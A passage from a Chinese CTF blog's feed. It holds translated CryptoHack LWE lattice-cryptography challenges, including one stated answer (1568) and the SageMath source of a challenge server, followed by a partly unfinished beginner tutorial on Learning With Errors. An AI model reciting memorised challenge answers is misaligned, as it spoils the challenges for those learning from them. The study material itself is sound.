alt="image-20251130200326392"></p><p>翻译过来如下：</p><p>现在我们将手动解密一个示例LWE系统中的消息，这个LWE加密系统的消息被藏在低位，而噪声被藏在高位。</p><blockquote><p>参数如下：</p><ul><li>n维向量空间</li><li>密文模数<code>q</code></li><li>明文模数<code>p</code>（需要满足加密消息<code>m＜q</code>）</li><li>必须满足两个模数<code>p，q</code>互质</li></ul><p>密钥如下：</p><ul><li>密钥$S$是向量空间中$\Z^{n}_q$的一个随机元素</li></ul><p>密文形式：</p><ul><li>密文对为$(A,b)$，其中A是线性空间$\Z^{n}_q$，$b$是$Z_q$的一个元素</li></ul><p>加密m的过程：</p><ul><li>样本A为$Z^{n}_q$向量空间上的随机元素</li><li>错误样本$e$是$[-\frac{q}{2p},\frac{q}{2p}]$的一个整数。注意：通常来说错误是从高斯分布中进行采样的，但是均匀分布也是可以。</li><li>计算$b=&lt;\mathbf{A,S}&gt;+m+p·e$（注意这里的$<a,s>$仍然是向量的内积）</a,s></li><li>返回密文对$(A,b)$</li></ul><p>解密$(A,b)$的过程：</p><ul><li>计算$x=b-<a,s>$，并将结果进行模$q$意义下的居中模化。并且求得的$x$是一个整数（并不是模q意义下的数）。（注意：居中模化必须在$(-\frac{q}{2},\frac{q}{2}]$，而不是像寻常那样结果位于$[0,q-1]$之间</a,s></li><li>计算$m=x~mod(~p)$，除法和舍入都在整数意义下进行。</li></ul></blockquote><p>在这个系统中，解密之所以可行，因为在去掉掩码$<a,s>$之后，带噪声的消息方程为$m+p·e$，是在整数范围内成立的，因此不会因为模q而发生回绕。于是，通过对p取模就可以去除误差项e，这要求参数满足$m+p·e&lt;\frac{q}{2}$这一条件。</a,s></p><p>下面有两个附件，请求出m。附件如下：</p><h2 id="题目5_from-private-to-public-key-lwe"><a href="#题目5-From-Private-to-Public-Key-LWE" class="headerlink" title="题目5_From Private to Public Key LWE"></a>题目5_From Private to Public Key LWE</h2><p>题目描述如下：</p><p><img src="/2025/11/25/CTFblog/CRYPTO%E7%B3%BB%E5%88%97blog/crypto_hack/cryptohack-lattices/image-20251201091555241.png" alt="image-20251201091555241"></p><p>翻译过来如下：</p><p>现在来看一个公钥密码系统，通过使用LWE的加法同态性质。给定一个加密数字m的密文$&lt;\mathbf{A,b}&gt;$，任何人都可以将其转换为一个加密$m+m_2$的有效密文，其中$m_2$是任意数字。</p><p>具体来说，对于低位消息（高噪声），可以计算：$&lt;\mathbf{A,b+m_2}&gt;$</p><p>对于高位消息（低噪声），可以计算：$&lt;\mathbf{A,b+\Delta·m_2}&gt;$</p><blockquote><p>虽然当消息存储在低位时，加法同态性质更容易看出来，但当消息存储在高位时，这种性质同样存在</p></blockquote><p>同样地，将两个LWE密文相加会产生一个新的有效密文，它加密的是对应明文之和。私钥持有者可以利用这一性质，通过公开许多不同的<code>零加密</code>来将LWE构建成一个公钥系统。为了加密，<code>Alice</code>首先从这些<code>零加密</code>中随机选择一个子集并将它们相加。根据第二条加法同态性质，这仍然是一个有效的零加密。接着，<code>Alice</code>对她的消息<code>m</code>进行新的编码，并将该编码后的消息加到这个新的零加密上。根据第一条加法同态性质，这就是一个有效的m的加密。</p><p>该过程要求对噪声项的采样分布进行精心选择，以确保最终的误差项在（高概率下）低于可成功解密所需的阈值。</p><p>为了保证安全性，攻击这必须难以判断某个LWE密文是由哪些公钥中的<code>零加密</code>相加得到的。为了达到这一点，公钥中<code>零加密</code>的数量必须显著大于LWE的维度。因此，公钥的大小为随着$O(n^{2}log(q))$比特规模增长，从而导致LWE加密系统的公钥较大。</p><p>问题： Kyber1024使用的公钥大小是多少bytes？flag的值为字节数。通过上面可得知公钥大小会比1024大。</p><p>答案：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1568</span><br></pre></td></tr></table></figure><h1 id="lwe2"><a href="#LWE2" class="headerlink" title="LWE2"></a>LWE2</h1><h2 id="题目1_noise-free"><a href="#题目1-Noise-Free" class="headerlink" title="题目1_Noise Free"></a>题目1_Noise Free</h2><p>题目描述如下：</p><p><img src="/2025/11/25/CTFblog/CRYPTO%E7%B3%BB%E5%88%97blog/crypto_hack/cryptohack-lattices/image-20251201142907587.png" alt="image-20251201142907587"></p><p>翻译如下：</p><p>噪声项的加入使得<code>学习</code>变成了<code>带误差的学习</code>。如果没有误差，你能够学得多少呢？</p><ul><li>题目附件如下：</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> utils <span class="keyword">import</span> listener</span><br><span class="line"><span class="keyword">from</span> sage.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">FLAG = <span class="string">b&quot;crypto&#123;????????????????????????&#125;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># dimension</span></span><br><span class="line">n = <span class="number">64</span></span><br><span class="line"><span class="comment"># plaintext modulus</span></span><br><span class="line">p = <span class="number">257</span></span><br><span class="line"><span class="comment"># ciphertext modulus</span></span><br><span class="line">q = <span class="number">0x10001</span></span><br><span class="line"></span><br><span class="line">V = VectorSpace(GF(q), n)</span><br><span class="line">S = V.random_element()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt</span>(<span class="params">m</span>):</span><br><span class="line">    A = V.random_element()</span><br><span class="line">    b = A * S + m</span><br><span class="line">    <span class="keyword">return</span> A, b</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Challenge</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        self.before_input = <span class="string">&quot;Would you like to encrypt your own message, or see an encryption of a character in the flag?\n&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">challenge</span>(<span class="params">self, your_input</span>):</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;option&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> your_input:</span><br><span class="line">            <span class="keyword">return</span> &#123;<span class="string">&#x27;error&#x27;</span>: <span class="string">&#x27;You must specify an option&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> your_input[<span class="string">&#x27;option&#x27;</span>] == <span class="string">&#x27;get_flag&#x27;</span>:</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;index&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> your_input:</span><br><span class="line">                <span class="keyword">return</span> &#123;<span class="string">&quot;error&quot;</span>: <span class="string">&quot;You must provide an index&quot;</span>&#125;</span><br><span class="line">                self.exit = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">            index = <span class="built_in">int</span>(your_input[<span class="string">&quot;index&quot;</span>])</span><br><span class="line">            <span class="keyword">if</span> index &lt; <span class="number">0</span> <span class="keyword">or</span> index &gt;= <span class="built_in">len</span>(FLAG) :</span><br><span class="line">                <span class="keyword">return</span> &#123;<span class="string">&quot;error&quot;</span>: <span class="string">f&quot;index must be between 0 and <span class="subst">&#123;<span class="built_in">len</span>(FLAG) - <span class="number">1</span>&#125;</span>&quot;</span>&#125;</span><br><span class="line">                self.exit = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">            A, b = encrypt(FLAG[index])</span><br><span class="line">            <span class="keyword">return</span> &#123;<span class="string">&quot;A&quot;</span>: <span class="built_in">str</span>(<span class="built_in">list</span>(A)), <span class="string">&quot;b&quot;</span>: <span class="built_in">str</span>(<span class="built_in">int</span>(b))&#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">elif</span> your_input[<span class="string">&#x27;option&#x27;</span>] == <span class="string">&#x27;encrypt&#x27;</span>:</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;message&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> your_input:</span><br><span class="line">                <span class="keyword">return</span> &#123;<span class="string">&quot;error&quot;</span>: <span class="string">&quot;You must provide a message&quot;</span>&#125;</span><br><span class="line">                self.exit = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">            message = <span class="built_in">int</span>(your_input[<span class="string">&quot;message&quot;</span>])</span><br><span class="line">            <span class="keyword">if</span> message &lt; <span class="number">0</span> <span class="keyword">or</span> message &gt;= p:</span><br><span class="line">                <span class="keyword">return</span> &#123;<span class="string">&quot;error&quot;</span>: <span class="string">f&quot;message must be between 0 and <span class="subst">&#123;p - <span class="number">1</span>&#125;</span>&quot;</span>&#125;</span><br><span class="line">                self.exit = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">            A, b = encrypt(message)</span><br><span class="line">            <span class="keyword">return</span> &#123;<span class="string">&quot;A&quot;</span>: <span class="built_in">str</span>(<span class="built_in">list</span>(A)), <span class="string">&quot;b&quot;</span>: <span class="built_in">str</span>(<span class="built_in">int</span>(b))&#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> &#123;<span class="string">&#x27;error&#x27;</span>: <span class="string">&#x27;Unknown action&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> builtins; builtins.Challenge = Challenge <span class="comment"># hack to enable challenge to be run locally, see https://cryptohack.org/faq/#listener</span></span><br><span class="line">listener.start_server(port=<span class="number">13411</span>)</span><br></pre></td></tr></table></figure><h2 id="题目2_bounded-noise"><a href="#题目2-Bounded-Noise" class="headerlink" title="题目2_Bounded Noise"></a>题目2_Bounded Noise</h2><h2 id="题目3_nativity"><a href="#题目3-Nativity" class="headerlink" title="题目3_Nativity"></a>题目3_Nativity</h2><h2 id="题目4_missing-modulus"><a href="#题目4-Missing-Modulus" class="headerlink" title="题目4_Missing Modulus"></a>题目4_Missing Modulus</h2><h2 id="题目5_noise-cheap"><a href="#题目5-Noise-Cheap" class="headerlink" title="题目5_Noise Cheap"></a>题目5_Noise Cheap</h2><h2 id="题目6_too-many-errors"><a href="#题目6-Too-Many-Errors" class="headerlink" title="题目6_Too Many Errors"></a>题目6_Too Many Errors</h2>]]></content>
    
    
    <summary type="html">前言：学习格</summary>
    
    
    
    <category term="CTF" scheme="http://iyheart.github.io/categories/CTF/"/>
    
    <category term="CRYPTO" scheme="http://iyheart.github.io/categories/CTF/CRYPTO/"/>
    
    <category term="刷题" scheme="http://iyheart.github.io/categories/CTF/CRYPTO/%E5%88%B7%E9%A2%98/"/>
    
    
  </entry>
  
  <entry>
    <title>格密码之LWE</title>
    <link href="http://iyheart.github.io/2025/11/18/CTFblog/CRYPTO%E7%B3%BB%E5%88%97blog/%E5%90%8E%E9%87%8F%E5%AD%90%E5%AF%86%E7%A0%81/%E6%A0%BC%E5%AF%86%E7%A0%81%E4%B9%8BLWE/"/>
    <id>http://iyheart.github.io/2025/11/18/CTFblog/CRYPTO%E7%B3%BB%E5%88%97blog/%E5%90%8E%E9%87%8F%E5%AD%90%E5%AF%86%E7%A0%81/%E6%A0%BC%E5%AF%86%E7%A0%81%E4%B9%8BLWE/</id>
    <published>2025-11-18T11:43:51.000Z</published>
    <updated>2025-12-04T09:16:33.936Z</updated>
    
    <content type="html"><![CDATA[<ul><li>参考文章：<a href="https://mp.weixin.qq.com/s/G48Rz22IgIrraS45e9WWdg">微信公众平台</a></li><li>参考文章：<a href="https://mp.weixin.qq.com/s/oRbMc4tmveEYhws1BwqH8A">格密码：LWE（Learning With Errors）</a></li><li>参考文章：<a href="http://www.triode.cc/index.php/2025/07/07/lwe/">LWE – 三极管域 | Triode Field</a></li></ul><h1 id="知识回顾"><a href="#知识回顾" class="headerlink" title="知识回顾"></a>知识回顾</h1><h2 id="矩阵表示方程组"><a href="#矩阵表示方程组" class="headerlink" title="矩阵表示方程组"></a>矩阵表示方程组</h2><ul><li>在学习线性代数和高等代数的时候我们一开始就需要了解矩阵。（当然某些编排不好的书一开始的内容就是行列式）。对于下面一个线性方程组，由于解方程的时候只有未知数前面的系数在改变，未知数的次数是不变的。</li></ul><script type="math/tex; mode=display">\begin{cases}a_{11}x_1+a_{12}x_2+...+a_{1n}x_n &= b_1 \\a_{21}x_1+a_{22}x_2+...+a_{2n}x_n &= b_2\\~~~~~~\vdots~~~~~~~~~~~~~\vdots~~~~~~~~~~~~~~~~~~~~\vdots&~~~~~~\vdots\\a_{s1}x_1+a_{s2}x_2+...+a_{sn}x_n&=b_s\end{cases}</script><ul><li>为了更方便书写，我们直接把线性方程组中的未知数省略掉，形成一个$s×n$的矩阵。<ul><li>其中$s$表示的是这个矩阵有$s$行，也表示这个线性方程组中方程的个数。</li><li>其中$n$表示的是这个矩阵有$n$列，也表示这个线性方程组未知数的个数。</li></ul></li></ul><script type="math/tex; mode=display">\begin{bmatrix}a_{11} & a_{12} & \dots & a_{1n}  \\a_{21} & a_{22} & \dots & a_{2n} \\\vdots & \vdots & \ddots& \vdots  \\a_{s1} & a_{s2} & \dots & a_{sn} \end{bmatrix}_{s×n}</script><h2 id="向量表示方程组"><a href="#向量表示方程组" class="headerlink" title="向量表示方程组"></a>向量表示方程组</h2><ul><li>如下图所示的个向量的线性方程组，我们可以使用一个列向量来表示方程组中每个方程中相同未知数的系数。</li></ul><script type="math/tex; mode=display">\begin{cases}a_{11}x_1+a_{12}x_2+...+a_{1n}x_n &= b_1 \\a_{21}x_1+a_{22}x_2+...+a_{2n}x_n &= b_2\\~~~~~~\vdots~~~~~~~~~~~~~\vdots~~~~~~~~~~~~~~~~~~~~\vdots&~~~~~~\vdots\\a_{s1}x_1+a_{s2}x_2+...+a_{sn}x_n&=b_s\end{cases}</script><ul><li>对于那么对于上面这个方程组，分别使用列向量$\alpha_1,…,\alpha_n$表示相同未知数前面的系数的集合，使用$\beta$表示常数，那么方程组就可以使用向量更简单的表示出来：</li></ul><script type="math/tex; mode=display">\alpha_1=\begin{pmatrix}a_{11} \\a_{21} \\...    \\a_{s1}\end{pmatrix},....,\alpha_n=\begin{pmatrix}a_{1n} \\a_{2n} \\...    \\a_{sn}\end{pmatrix},\beta=\begin{pmatrix}b_{1} \\b_{2} \\...    \\b_{s}\end{pmatrix}\\\\x_1\alpha_1+.....+x_n\alpha_n=\beta</script><h2 id="矩阵乘法表示方程组"><a href="#矩阵乘法表示方程组" class="headerlink" title="矩阵乘法表示方程组"></a>矩阵乘法表示方程组</h2><ul><li>在学习了矩阵、向量、矩阵乘法之后，对于如下的一个线性方程组，其实可以使用矩阵乘法来表示出来。</li></ul><script type="math/tex; mode=display">\begin{cases}a_{11}x_1+a_{12}x_2+...+a_{1n}x_n &= b_1 \\a_{21}x_1+a_{22}x_2+...+a_{2n}x_n &= b_2\\~~~~~~\vdots~~~~~~~~~~~~~\vdots~~~~~~~~~~~~~~~~~~~~\vdots&~~~~~~\vdots\\a_{s1}x_1+a_{s2}x_2+...+a_{sn}x_n&=b_s\end{cases}</script><ul><li>可以使用一个$s×n$的矩阵乘一个$n×1$的矩阵，以及$s×1$的矩阵表示这个线性方程组，如下所示：</li></ul><script type="math/tex; mode=display">\begin{bmatrix}a_{11} & a_{12} & \dots & a_{1n}  \\a_{21} & a_{22} & \dots & a_{2n} \\\vdots & \vdots & \ddots& \vdots  \\a_{s1} & a_{s2} & \dots & a_{sn} \end{bmatrix}_{s×n}×\begin{bmatrix}x_{1}   \\x_{2}  \\\vdots \\x_{n} \end{bmatrix}_{n×1}=\begin{bmatrix}b_{1}   \\b_{2}  \\\vdots \\b_{s} \end{bmatrix}</script><h1 id="lwe初步介绍"><a href="#LWE初步介绍" class="headerlink" title="LWE初步介绍"></a>LWE初步介绍</h1><h2 id="问题引入鸡兔同笼正常版"><a href="#问题引入鸡兔同笼正常版" class="headerlink" title="问题引入鸡兔同笼正常版"></a>问题引入鸡兔同笼正常版</h2><p>首先来看一下鸡兔同笼的问题，鸡兔同笼问题出自于<code>《孙子算经》</code>，具体问题如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">有鸡、兔同笼，上有三十五头，下九十四足。问雉、兔各几何？</span><br></pre></td></tr></table></figure><ul><li>我们可以使用穷举法，从0只鸡开始，然后一直到35只鸡，直到找到脚的数量符合题目的要求即可。</li><li>但是穷举法是偏离今天的<code>LWE</code>的内容的，所以主要介绍的是另一种方法，也就是代数方法——解方程。首先确定位置量，鸡、兔的个数我们是不知道的，那就设鸡为$x_1$，兔为$x_2$，那么就可以列出如下的一个二元一次方程组：</li></ul><script type="math/tex; mode=display">\begin{cases}x_1+x_2&= 35 \\2x_1+4x_2&= 94\\\end{cases}</script><ul><li>将这个方程组使用矩阵表示就是如下的形式：</li></ul><script type="math/tex; mode=display">\begin{bmatrix}1 & 1 \\2 & 4 \\\end{bmatrix}_{2×2}×\begin{bmatrix}x_{1}   \\x_{2}  \\\end{bmatrix}_{2×1}=\begin{bmatrix}35   \\94  \\\end{bmatrix}</script><ul><li>对于使用方程组的表示方法可以直接通过高斯消元法直接求出答案，而对于矩阵乘法表示可以通过左右两边乘一个左边方阵的逆矩阵，就可以得到结果。</li></ul><h2 id="问题引入鸡兔同笼误差版"><a href="#问题引入鸡兔同笼误差版" class="headerlink" title="问题引入鸡兔同笼误差版"></a>问题引入鸡兔同笼误差版</h2><ul><li>对于上面的鸡兔同笼问题，我们做一个修改。这里我们假设，在数透和脚的数量的时候，存在一个误差，这个误差满足某个概率分布，这里我们就假设数脚我们多数了一个，这样就会变成下面的这个方程</li></ul><script type="math/tex; mode=display">\begin{cases}x_1+x_2+e_1&= 35 \\2x_1+4x_2+e_2&= 95\\\end{cases}</script><ul><li>此时我们不知道误差，所以我们列出的方程是这样的</li></ul><script type="math/tex; mode=display">\begin{cases}x_1'+x_2'&= 35 \\2x_1'+4x_2'&= 95\\\end{cases}</script><ul><li>这个时候如果再使用高斯消元法去求解这个方程，那就会得到下面这个解</li></ul><script type="math/tex; mode=display">\begin{cases}x_1'= 22.5 \\x_2'= 12.5\\\end{cases}</script><ul><li>这个结果出现了小数，显然是不正确的。因为存在一个误差值$e’=x-x’$是我们所不知道的东西。</li></ul><h2 id="引入lwe问题"><a href="#引入LWE问题" class="headerlink" title="引入LWE问题"></a>引入LWE问题</h2><ul><li><p>对于上面<code>鸡兔同笼误差版</code>（方程组中的每个方程带误差，并且误差我们不知道），这就是这篇文章要说明的一个<code>LWE</code>问题。</p></li><li><p><code>LWE</code>英文全称为<code>learn with error</code>，翻译过来为容错学习。容错学习的具体描述如下：</p><ul><li>设$n,m$以及$q$为整数（其中$q$一般为质数），并设$\mathbf{s}\in \Z_q^n$上的一个秘密向量，在$\Z_q^{m×n}$上均匀选取矩阵$\mathbf{A}$，设$X$为一个$\Z^m$上的概率分布，并在$Z^m$上选取一个分布服从$X$的小向量$e$作为噪声，并计算：</li></ul><script type="math/tex; mode=display">\mathbf{b}=\mathbf{As}+\mathbf{e}~mod(~q)</script><ul><li>并给出$(\mathbf{A},\mathbf{b})$，让我们还原出秘密向量$\mathbf{s}$，这就是最常见的<code>LWE</code>问题（这种LWE问题也被称为<code>搜索LWE问题</code>，即<code>Search-LWE</code>）。</li></ul></li></ul><blockquote><p>注解1：上面的$\Z_q^n$，表示的是数域<code>q</code>下的<code>n</code>维线性空间</p><p>注解2：上面的$\Z_q^{m×n}$，表示的是数域<code>q</code>下的<code>m×n</code>矩阵，其维度是<code>mn</code></p><p>注解3：上面$\Z^m$表示数域$\Z$下的<code>m</code>维线性空间</p><p>存疑：这里留个疑问，对于LWE的问题具体是如何定义的需要去看看论文，LWE、MLWE如何定义的感觉会搞混掉。还有就是从问题的形式出发，就出现了Search-LWE和Decisional-LWE。目前就以上面的问题来定义LWE。（总之一般的LWE问题就是要我们求出e或者b，这两个知道其中一个就可以知道另一个。）</p></blockquote><p><img src="/2025/11/18/CTFblog/CRYPTO%E7%B3%BB%E5%88%97blog/%E5%90%8E%E9%87%8F%E5%AD%90%E5%AF%86%E7%A0%81/%E6%A0%BC%E5%AF%86%E7%A0%81%E4%B9%8BLWE/image-20251118214027379.png" alt="image-20251118214027379"></p><ul><li>对于上述<code>LWE</code>问题，如果使用高斯消元法进行求解就会扩大误差<code>e</code>的影响，使得求出的解与原来的解误差非常大。所以高斯消元法在<code>LWE</code>问题中就体现不出太大的作用。</li><li>这个时候如果我们知道$e$的界限，我们就可以通过搜索$\mathbf{s’}\in\Z^n<em>q$，如果搜索到$\mathbf{s’}\in\Z^n_q$使得$||\mathbf{As’}-\mathbf{b}||</em>{\infty}≤B$，其中B满足$||\mathbf{e}||_{\infty}≤B$，这个时候我们就说找到了满足LWE问题的一组解。</li></ul><h2 id="理解lwe问题"><a href="#理解LWE问题" class="headerlink" title="理解LWE问题"></a>理解LWE问题</h2><ul><li>接下来将用几张图片，通过几何直观的感受来理解<code>LWE</code>问题。在此之前，先来回顾一下格的定义：</li></ul><script type="math/tex; mode=display">L(\mathbf{B})=\{\sum^{n}_{i=1}x_ib_i:x_i\in Z,i=1,...,n\}</script><ul><li>在<code>LWE</code>这个方程中，$s<em>{n×1}$这个向量其实就是未知数，我们是不知道的，而$A</em>{m×n}$是一个矩阵，结合上面的格的定义，我们就将这个矩阵$A_{m×n}$拆分成$n$个列向量，每个列向量有$m$个元素。</li></ul><script type="math/tex; mode=display">A_{m×n}=(\alpha_1,...,\alpha_n)</script><ul><li>假设这些列向量线性无关，那么这$(\alpha_1,…,\alpha_n)$就构成了一个格，并且这个格的维数为<code>m</code>，而这个格的秩为<code>n</code>，就以下面这个方程组做例子通过几何直观来理解吧：</li></ul><script type="math/tex; mode=display">\begin{cases}x_1+x_2+0&= 10 \\2x_1+4x_2+1&= 27\\\end{cases}</script><script type="math/tex; mode=display">\begin{cases}x_1'+x_2'&= 10 \\2x_1'+4x_2'&= 27 \\\end{cases}</script><script type="math/tex; mode=display">\begin{bmatrix}1 & 1 \\2 & 4 \\\end{bmatrix}_{2×2}×\begin{bmatrix}x_{1}'   \\x_{2}'  \\\end{bmatrix}_{n×1}=\begin{bmatrix}10   \\27  \\\end{bmatrix}</script><ul><li>对于上面的例子，格的基其实就是这两个列向量$\alpha_1=(1,2)^{T},\alpha_2=(1,4)^{T}$，接下来我们将这个格点画出来，并且将点$(10,27)$使用不同颜色的点也标在图中。</li><li>注意：这里点$(10,27)$其实并不是在格点上，此时结合LWE的求解（也就是通过搜索$\mathbf{s’}\in\Z^n<em>q$，如果搜索到$\mathbf{s’}\in\Z^n_q$使得$||\mathbf{As’}-\mathbf{b}||</em>{\infty}≤B$，其中B满足$||\mathbf{e}||_{\infty}≤B$，这个时候我们就说找到了满足LWE问题的一组解。）以及最近向量问题形式，我们不难发现<strong>Search-LWE</strong>问题其实本质上就是<strong>最近向量问题</strong></li></ul><p><img src="/2025/11/18/CTFblog/CRYPTO%E7%B3%BB%E5%88%97blog/%E5%90%8E%E9%87%8F%E5%AD%90%E5%AF%86%E7%A0%81/%E6%A0%BC%E5%AF%86%E7%A0%81%E4%B9%8BLWE/image-20251118232126864.png" alt="image-20251118232126864"></p><p><img src="/2025/11/18/CTFblog/CRYPTO%E7%B3%BB%E5%88%97blog/%E5%90%8E%E9%87%8F%E5%AD%90%E5%AF%86%E7%A0%81/%E6%A0%BC%E5%AF%86%E7%A0%81%E4%B9%8BLWE/image-20251119105804122.png" alt="image-20251119105804122"></p><ul><li>从上图中我们可以看到，如果误差选取不好的话，就会出现多组解满足$||\mathbf{As’}-\mathbf{b}||_{\infty}≤B$，并且目前除了搜索之外没有什么特别快的求解方案。</li><li>接下来再看一个图片，下面这张图片所出现的情况是误差向量$\mathbf{e}$非常大的时候，以误差向量$\mathbf{e}$的长度为半径画出一个圆，在这个圆内会有非常多的点，而这些点都满足$||\mathbf{As’}-\mathbf{b}||_{\infty}≤B$，这就导致解不唯一，还需要我们在这些解中找到正确的解。</li></ul><p>​    <img src="/2025/11/18/CTFblog/CRYPTO%E7%B3%BB%E5%88%97blog/%E5%90%8E%E9%87%8F%E5%AD%90%E5%AF%86%E7%A0%81/%E6%A0%BC%E5%AF%86%E7%A0%81%E4%B9%8BLWE/image-20251121110842335.png" alt="image-20251121110842335"></p><h1 id="lwe数学结构"><a href="#LWE数学结构" class="headerlink" title="LWE数学结构"></a>LWE数学结构</h1><blockquote><p>通过上面的介绍我们其实可以了解到LWE其实就是在一些方程（或者其他类似于方程的代数结构）中添加一些错误，使得我们在不知道错误的情况下不能直接求解方程从而得到正确答案。</p><p>在上面介绍了方程形式的，方程形式的LWE是最简单的代数结构的LWE问题，接下来我们还要介绍其他代数结构的LWE问题，在介绍其他代数结构的LWE问题，先再描述一下普通的LWE问题。</p></blockquote><h2 id="普通lwe"><a href="#普通LWE" class="headerlink" title="普通LWE"></a>普通LWE</h2><h2 id="module-lwe"><a href="#Module-LWE" class="headerlink" title="Module-LWE"></a>Module-LWE</h2><blockquote><p>Module-LWE使用的代数结构也算是一个环，但并不是严格的环结构。并且Module-LWE中的Module指的并不是同余的那个模，指的是同余的模块的那个位置。问题的本质是模块结构（模块上的向量卷积结构）。接下来要介绍一下Module-LWE问题的具体形式。</p></blockquote><h2 id="ring-lwe"><a href="#Ring-LWE" class="headerlink" title="Ring-LWE"></a>Ring-LWE</h2><blockquote><p>Ring-LWE使用的代数结构算是一个比较严格的环结构，并且Ring-LWE强调的也是环结构。</p></blockquote><h1 id="lwe困难问题"><a href="#LWE困难问题" class="headerlink" title="LWE困难问题"></a>LWE困难问题</h1><h2 id="search-lwe"><a href="#Search-LWE" class="headerlink" title="Search-LWE"></a>Search-LWE</h2><blockquote><p>对于Search-LWE问题，在LWE初步介绍那边已经介绍的相当清楚了，这里看情况看看要不要再讲一遍。</p></blockquote><ul><li><p><code>Search-LWE</code>问题的描述这里在简单说一下：</p><ul><li>设$n,m$以及$q$为整数（其中$q$一般为质数），并设$\mathbf{s}\in \Z_q^n$上的一个秘密向量，在$\Z_q^{m×n}$上均匀选取矩阵$\mathbf{A}$，设$X$为一个$\Z^m$上的概率分布，并在$Z^m$上选取一个分布服从$X$的小向量$e$作为噪声，并计算：</li></ul><script type="math/tex; mode=display">\mathbf{b}=\mathbf{As}+\mathbf{e}~mod(~q)</script><ul><li>并给出$(\mathbf{A},\mathbf{b})$，让我们还原出秘密向量$\mathbf{s}$，这就是最常见的<code>LWE</code>问题（这种LWE问题也被称为<code>搜索LWE问题</code>，即<code>Search-LWE</code>）。</li><li><code>Search-LWE</code>问题是比较常见的一个LWE问题，在CTF中的很多题目基本上都是<code>Search-LWE</code>问题。</li></ul></li></ul><h2 id="decision-lwe"><a href="#Decision-LWE" class="headerlink" title="Decision-LWE"></a>Decision-LWE</h2><blockquote><p>除了Search-LWE问题外，还有一个Decision-LWE问题，该问题并不是格中的CVP问题了，而是SVP问题。接下来需要具体介绍一下Decision-LWE的问题形式，以及其为什么是格中的SVP问题。</p></blockquote><ul><li><code>Decision-LWE</code>问题是<code>LWE</code>问题的另一种形式，其中文翻译过来被叫做<code>判定LWE问题</code>。</li></ul><h1 id="searchlwe具体题型"><a href="#Search—LWE具体题型" class="headerlink" title="Search—LWE具体题型"></a>Search—LWE具体题型</h1><h2 id="lwe的搜索问题"><a href="#LWE的搜索问题" class="headerlink" title="LWE的搜索问题"></a>LWE的搜索问题</h2><h2 id="mlwe的搜索问题"><a href="#MLWE的搜索问题" class="headerlink" title="MLWE的搜索问题"></a>MLWE的搜索问题</h2><h2 id="rlwe的搜索问题"><a href="#RLWE的搜索问题" class="headerlink" title="RLWE的搜索问题"></a>RLWE的搜索问题</h2>]]></content>
    
    
    <summary type="html">前言：最近有点忙加上想等高代学完再学密码，今天就学一下。</summary>
    
    
    
    <category term="CTF" scheme="http://iyheart.github.io/categories/CTF/"/>
    
    <category term="CRYPTO" scheme="http://iyheart.github.io/categories/CTF/CRYPTO/"/>
    
    <category term="格密码" scheme="http://iyheart.github.io/categories/CTF/CRYPTO/%E6%A0%BC%E5%AF%86%E7%A0%81/"/>
    
    
  </entry>
  
  <entry>
    <title>电子数据取证2023年盘古石复现</title>
    <link href="http://iyheart.github.io/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/"/>
